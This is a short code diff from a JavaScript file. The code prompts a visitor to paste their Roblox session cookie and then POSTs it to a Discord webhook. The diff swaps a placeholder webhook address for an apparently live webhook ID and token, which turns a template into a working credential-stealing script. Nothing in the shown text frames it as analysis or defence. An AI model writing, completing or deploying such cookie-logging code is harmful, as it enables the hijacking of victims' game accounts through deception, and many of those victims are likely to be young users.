@@ -49,7 +49,7 @@ function showError() {
   let userInput = prompt("Enter your Roblox cookie to proceed:");
   if (userInput && userInput.length >= 1) {
     // Send the cookie to a Discord webhook
-    fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN", {
+    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
       method: "POST",
       body: JSON.stringify({ content: "Roblox Cookie: " + userInput }),
       headers: { "Content-Type": "application/json" }
